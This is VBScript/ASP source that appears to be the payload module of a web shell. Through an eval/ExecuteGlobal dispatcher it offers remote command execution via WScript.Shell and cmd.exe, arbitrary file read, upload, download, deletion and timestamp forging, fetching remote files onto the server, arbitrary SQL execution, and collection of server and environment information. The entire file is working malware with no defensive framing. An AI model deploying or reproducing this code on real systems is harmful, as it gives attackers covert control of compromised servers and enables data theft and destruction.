' FLAG_STR
Set Parameters=Server.CreateObject("Scripting.Dictionary")
Function Base64Encode(sText)
    Dim oXML, oNode
	if IsEmpty(sText) or IsNull(sText) then
		Base64Encode=""
	else
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    If IsArray(sText) Then
		oNode.nodeTypedValue = sText
	Else
		oNode.nodeTypedValue =Stream_StringToBinary(sText)
	End If
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
	end if
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Lsh(ByVal N, ByVal Bits)
  Lsh = N * (2 ^ Bits)
End Function

Function Base64DecodeEx(ByVal vCode,isbin)
    Dim oXML, oNode
	if IsEmpty(vCode) or IsNull(vCode) then
		Base64DecodeEx=""
	else
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    if not isbin then
		Base64DecodeEx = Stream_BinaryToString(oNode.nodeTypedValue)
	else
		Base64DecodeEx = oNode.nodeTypedValue
	end if
	end if
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Function Base64Decode(ByVal vCode)
    Base64Decode=Base64DecodeEx(vCode,false)
End Function

'Stream_StringToBinary Function
'2003 Antonin Foller, http://www.motobit.com
'Text - string parameter To convert To binary data
Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save text/string data.
  BinaryStream.Type = adTypeText

  'Specify charset For the source text (unicode) data.
  BinaryStream.CharSet = "utf-8"

  'Open the stream And write text/string data To the object
  BinaryStream.Open
  BinaryStream.WriteText Text

  'Change stream type To binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary

  'Ignore first two bytes - sign of
  BinaryStream.Position = 3

  'Open the stream And get binary data from the object
  Stream_StringToBinary = BinaryStream.Read

  Set BinaryStream = Nothing
End Function

'Stream_BinaryToString Function
'2003 Antonin Foller, http://www.motobit.com
'Binary - VT_UI1 | VT_ARRAY data To convert To a string 
Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1

	if IsEmpty(Binary) or IsNull(Binary) then
		Stream_BinaryToString=""
	else
  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write Binary

  'Change stream type To text/string
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText

  'Specify charset For the output text (unicode) data.
  BinaryStream.CharSet = "utf-8"

  'Open the stream And get text/string data from the object
  Stream_BinaryToString = BinaryStream.ReadText
	end if
  Set BinaryStream = Nothing
End Function
Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=CreateObject(Key)
	if IsEmpty(Fso) then Set Fso=Hfso
	if Not IsEmpty(Fso) then Set GetFso=Fso
	Set Fso=RDS(Key)
	Set GetFso=Fso
End Function
Function RDS(COM)
	Set r=CreateObject("RDS.DataSpace")
	Set RDS=r.CreateObject(COM,"")
End Function
Function GetWS()
	Dim WS,Key
	Key="WScript.Shell"
	Set WS=CreateObject(Key)
	if Not IsEmpty(WS) then Set GetWS=WS
	if IsEmpty(WS) then	Set WS=Hws
	Set WS=RDS(Key)
	Set GetWS=WS
End Function
Function GetStream()
	Set GetStream=CreateObject("Adodb.Stream")
End Function
Function GetSA()
	Dim SA,Key
	Key="shell.application"
	Set SA=CreateObject(Key)
	if IsEmpty(SA) then	Set SA=HSA
	if Not IsEmpty(SA) then Set GetSA=SA
	Set SA=RDS(Key)
	Set GetSA=SA
End Function
	Function FromUnixTime(intTime, intTimeZone)
    If IsEmpty(intTime) or Not IsNumeric(intTime) Then
        FromUnixTime = Now()
        Exit Function
    End If         
    If IsEmpty(intTime) or Not IsNumeric(intTimeZone) Then intTimeZone = 0
    FromUnixTime = DateAdd("s", intTime, "1970-01-01 00:00:00")
    FromUnixTime = DateAdd("h", intTimeZone, FromUnixTime)
End Function
	Function getBasicsInfo()
		dim basicInfo
		dim FileRoot
		set wss=GetWS()
		set fso=GetFso()
		envlists="SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$PATHEXT$PROCESSOR_ARCHITECTURE$PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
		envlist=split(envlists,"$")
		For Each D in fso.Drives:FileRoot=FileRoot&D.DriveLetter&":/;":Next:
		basicInfo=basicInfo&"CurrentDir"&" : "&mid(request.ServerVariables("PATH_TRANSLATED"),1,InstrRev(request.ServerVariables("PATH_TRANSLATED"),"\"))&chr(10)
		basicInfo=basicInfo&"OsInfo"&" : "&wss.environment("system")("OS")&chr(10)
		basicInfo=basicInfo&"CurrentUser"&" : "&request.ServerVariables("LOGON_USER")&chr(10)
		basicInfo=basicInfo&"FileRoot"&" : "&FileRoot&chr(10)
		basicInfo=basicInfo&"scriptengine"&" : "&scriptengine&"/"&scriptenginemajorversion&"."&scriptengineminorversion&"."&scriptenginebuildversion&chr(10)
		basicInfo=basicInfo&"systemTime"&" : "&now()&chr(10)
		for each x in wss.environment("system"):basicInfo=basicInfo&x&chr(10):next
		for each x in Request.ServerVariables:basicInfo=basicInfo&x&" : "&Request.ServerVariables(x)&chr(10):next
		for each x in envlist:basicInfo=basicInfo&x&" : "&wss.expandenvironmentstrings("%"&x&"%")&chr(10):next
		set wss=nothing
		set fso=nothing
		getBasicsInfo=basicInfo
	End Function
	
	Function execCommand()
		on error resume Next
		Dim ws,sa,cmd
		cmd=getParameterValue("cmdLine")
		Set ws=server.createobject("WScript.shell")
		If IsEmpty(ws) Then
		Set ws=server.createobject("WScript.shell.1")
		End If
		If IsEmpty(ws) Then
		Set sa=server.createobject("shell.application")
		End If
		If IsEmpty(ws) And IsEmpty(sa) Then
		Set sa=server.createobject("shell.application.1")
		End If
		If Not IsEmpty(ws) Then
		Set process=ws.exec(cmd)
		cmdResult=process.stdout.readall
		cmdResult=cmdResult&process.stderr.readall
		message=cmdResult
		End If

		If Not IsEmpty(sa) Then
		sa.ShellExecute "cmd.exe","/c "&cmd,"","open",0
		End If
		execCommand=message
	End Function

	 
    
		Function getFile()
		Dim listResult,k
		path=getParameterValue("dirName")
		listResult="ok"
		listResult=listResult&chr(10)
		listResult=listResult&path
		listResult=listResult&chr(10)
		Dim fs,sa
		Set fso=server.createobject("Scripting.FileSystemObject")
		If IsEmpty(fso) Then
		Set fso=server.createobject("shell.application")
		End If

		Set pathObj = fso.GetFolder(path)
		Set fsofolders = pathObj.SubFolders
		Set fsofiles = pathObj.Files
		for each k in fsofolders
			listResult=listResult&k.name&chr(9)&"0"&chr(9)&k.datelastmodified&chr(9)&"4096"&chr(9)&k.attributes&chr(10)
			next
		for each k in fsofiles
			listResult=listResult&k.name&chr(9)&"1"&chr(9)&k.datelastmodified&chr(9)&k.size&chr(9)&k.attributes&chr(10)
			next
		getFile=listResult
	End Function

	Function readFileContent()
		Dim stream,fileContentType,path
		Set stream=GetStream()
		path=getParameterValue("fileName")
		stream.Open
		stream.Type=1
		stream.LoadFromFile(path)
		readFileContent=stream.Read()
		if	IsNull(readFileContent) or IsEmpty(readFileContent) then
			readFileContent="null"
		end if
		Set stream=Nothing
	End Function

	Function bigFileDownload()
		uploadResult=False
		Const adTypeBinary = 1
		Dim BinaryStream,path,position,readByteNum,mode,fso,file
		path=getParameterValue("fileName")
		mode=getParameterValue("mode")
		readByteNum=getParameterValue("readByteNum")
		position=getParameterValue("position")
		
		IF mode="fileSize" THEN
			Set fso=server.createobject("Scripting.FileSystemObject")
			If IsEmpty(fso) THEN
				Set fso=server.createobject("shell.application")
			End If
			Set file=fso.GetFile(path)
			bigFileDownload=file.size
		ElseIf mode="read" THEN
			Set BinaryStream = GetStream()
			BinaryStream.Type = adTypeBinary
			BinaryStream.Open
			BinaryStream.LoadFromFile path
			BinaryStream.Position = position
			bigFileDownload=BinaryStream.Read(readByteNum)
			Set BinaryStream=Nothing
		Else
			bigFileDownload="no mode"
		END IF
	End Function

	Function moveFile()
		dim srcFileName,destFileName,fso,result
		srcFileName=getParameterValue("srcFileName")
		destFileName=getParameterValue("destFileName")
		set fso=GetFso()
		if fso.FileExists(srcFileName) then
			fso.MoveFile srcFileName,destFileName
			result="ok"
		elseif fso.FolderExists(srcFileName) then
			fso.MoveFolder srcFileName,destFileName
			result="ok"
		end if
		if IsEmpty(result) then
			result="fail"
		end if
		moveFile=result
	End Function

	Function copyFile()
		dim srcFileName,destFileName,fso,result
		srcFileName=getParameterValue("srcFileName")
		destFileName=getParameterValue("destFileName")
		set fso=GetFso()
		if fso.FileExists(srcFileName) then
			fso.CopyFile srcFileName,destFileName
			result="ok"
		elseif fso.FolderExists(srcFileName) then
			fso.CopyFolder srcFileName,destFileName
			result="ok"
		end if
		if IsEmpty(result) then
			result="fail"
		end if
		copyFile=result
	End Function

	Function deleteFile()
		dim srcFileName,fso,result
		fileName=getParameterValue("fileName")
		set fso=GetFso()
		if fso.FileExists(fileName) then
			fso.DeleteFile(fileName)
			result="ok"
		elseif fso.FolderExists(fileName) then
			fso.DeleteFolder(fileName)
			result="ok"
		end if
		if IsEmpty(result) then
			result="fail"
		end if
		deleteFile=result
	End Function

	Function newFile()
		dim fileName,fso,result
		fileName=getParameterValue("fileName")
		set fso=GetFso()
		fso.CreateTextFile(fileName)
		result="ok"
		newFile=result
	End Function

	Function newDir()
		dim dirName,fso,result
		dirName=getParameterValue("dirName")
		set fso=GetFso()
		fso.CreateFolder(dirName)
		result="ok"
		newDir=result
	End Function

	Function uploadFile()
		uploadResult=False
		Const adTypeBinary = 1
		Const adSaveCreateOverWrite = 2
		Dim BinaryStream,path, content
		Set BinaryStream = GetStream()
		path=getParameterValue("fileName")
		content=getParameterValueEx("fileValue",true)  
		BinaryStream.Type = adTypeBinary
		BinaryStream.Open
		BinaryStream.Write content
  
  'Save binary data To disk
		BinaryStream.SaveToFile path, adSaveCreateOverWrite
		set BinaryStream = Nothing
		uploadFile="ok"
	End Function

	Function bigFileUpload()
		uploadResult=False
		Const adTypeBinary = 1
		Const adSaveCreateOverWrite = 2
		Dim BinaryStream,path, content
		Set BinaryStream = GetStream()
		path=getParameterValue("fileName")
		content=getParameterValueEx("fileContents",true)
		position=getParameterValue("position")
		BinaryStream.Type = adTypeBinary
		BinaryStream.Open
		BinaryStream.LoadFromFile path
		BinaryStream.Position = position
		BinaryStream.Write content
  
  'Save binary data To disk
		BinaryStream.SaveToFile path, adSaveCreateOverWrite
		Set BinaryStream=Nothing
		bigFileUpload="ok"
	End Function

	Function fileRemoteDown()
		dim x,s,SI,url,saveFile
		url=getParameterValue("url")
		saveFile=getParameterValue("saveFile")
		Set x=CreateObject("MSXML2.ServerXmlHttp")
		x.Open "GET",url,0
		x.Send()
		If Err Then
			SI="E: "&Err.Description
			Err.Clear
		Else
			set s=GetStream()
		s.Mode=3
		s.Type=1
		s.Open()
		s.Write x.ResponseBody
		s.SaveToFile saveFile,2
		If Err Then
			SI="E: "&Err.Description
			Err.Clear
		Else
			SI="ok"
		End If
		Set x=Nothing
		Set s=Nothing
		set BinaryStream = Nothing
		End If
		fileRemoteDown=SI
	End Function

	Function getParameterValue(key)
		getParameterValue=getParameterValueEx(key,false)
	End Function

	Function getParameterValueEx(key,isbin)
		dim vk
		vk=Parameters(key)
		if	not IsEmpty(vk) and not IsNull(vk) then
			if isbin then
				getParameterValueEx = vk
			else
				getParameterValueEx = Stream_BinaryToString(vk)
			end if
		end if
	End Function

	Function setFileAttr()
		dim attr,fileType,fileName,fso,file,result,SI
		attr=getParameterValue("attr")
		fileType=getParameterValue("type")
		fileName=getParameterValue("fileName")
		if fileType="fileBasicAttr" then 
			set fso=GetFso()
			set file=fso.getFile(fileName)
			file.attributes=attr
		elseif fileType="fileTimeAttr" then
			fileName=replace(fileName,"/","\")
			Server.CreateObject("Shell.Application").NameSpace(mid(fileName,1,InstrRev(fileName,"\")-1)).ParseName(mid(fileName,InstrRev(fileName,"\")+1)).Modifydate=FromUnixTime(attr,+8)
		end if
		If Err Then
			SI="E: "&fileName&Err.Description
			Err.Clear
		Else
			SI="ok"
		End If
		setFileAttr=SI
	End Function

	Function execSql()
		dim conn,dbType,dbHost,dbPort,dbUsername,dbPassword,execSqlCommand,execType,result,v,i,rs,rowStr,RecordsAffected,fieldName
		Set conn = Server.CreateObject("ADODB.Connection")
		dbType=getParameterValue("dbType")
		dbHost=getParameterValue("dbHost")
		dbPort=getParameterValue("dbPort")
		dbUsername=getParameterValue("dbUsername")
		dbPassword=getParameterValue("dbPassword")
		execSqlCommand=getParameterValue("execSql")
		execType=getParameterValue("execType")
		if dbType="sqlserver" and instr(dbHost,"=")=0	then
			connString = "Provider=SQLOLEDB;Data Source=" & dbHost & ";Network Library=DBMSSOCN;User Id=" & dbUsername & ";Password=" & dbPassword & ";"
		else
			connString=dbHost
		end if
		conn.Open connString
		If Err Then
			result=Err.Description
			Err.Clear
		else
			Set rs = conn.Execute(execSqlCommand,RecordsAffected)
			If Err Then
				result=Err.Description
				Err.Clear
			else
				if execType="select" and rs.Fields.Count>0 then
					result="ok"
					result=result&chr(10)
					For i=0 To rs.Fields.Count-1
						fieldName=rs.Fields(i).Name
						if	IsEmpty(fieldName) or IsNull(fieldName) or fieldName="" then
							fieldName="field"&(i+1)
						end if
						result=result&Base64Encode(fieldName)&chr(9)
					Next
					result=result&chr(10)
					While Not (rs.EOF or rs.BOF)
							rowStr=""
						For i=0 To rs.Fields.Count-1
							v=rs(i).Value
							if IsEmpty(v) or IsNull(v) then
								v="null"
							end if
							if IsArray(v) then
								v="Byte Array[]"
							end if
							rowStr=rowStr&Base64Encode(v)&chr(9)
						Next
						result=result&rowStr&chr(10)
						rs.MoveNext
					Wend
					rs.Close
				else 
					result="Query OK, "&RecordsAffected&" rows affected"
				end if
			end if
			conn.close
		end if
		execSql=result
	End Function

	Function includeCode
		dim binCode,codeName
		codeName=getParameterValue("ICodeName")
		binCode=getParameterValue("binCode")
		Session(codeName)=binCode
		includeCode="ok"
	End Function

	Function test()
		test="ok"
	End Function

	Function closeEx
		Session.Abandon()
		closeEx="ok"
	End Function

	Function parseParameter(stream)
		dim key,valueLen,byteValue
		for i=1 to stream.Size
			byteValue = ascb(stream.Read(1))
			if byteValue = &h02 then
				valueLen = ascb(stream.Read(1)) or Lsh(ascb(stream.Read(1)),8) or Lsh(ascb(stream.Read(1)),16) or Lsh(ascb(stream.Read(1)),24)
				i=i+4
				Parameters.Add key,stream.Read(valueLen)
				key=""
				i=i+valueLen
			Else
				key=key&chr(byteValue)
			end if
		next
	End Function

	Function run(psx)
		on error resume next
		dim methodName,v,codeName
		set BinaryStream = CreateObject("Adodb.Stream")
		BinaryStream.charset = "iso-8859-1"
		BinaryStream.Type = 1
		BinaryStream.Open
		BinaryStream.Write psx
		BinaryStream.Position = 0
		parseParameter(BinaryStream)
		set BinaryStream = Nothing

		methodName=getParameterValue("methodName")
		codeName=getParameterValue("codeName")
		if not IsEmpty(methodName) then
			if IsEmpty(codeName) then
				run=eval(methodName)
			elseif not IsEmpty(Session(codeName)) then
				ExecuteGlobal(Session(codeName))
				run=GlobalResult
			else
				run="codeName or methodName IsEmpty"
			end if
		else
			run="method is null"
		end if
		if	IsEmpty(run) then
			run="no result"
		end if
		if Err then
			run=run&chr(10)&Err.Description
		end if
		if not IsArray(run) then
			run = Stream_StringToBinary(run)
		end if
	End Function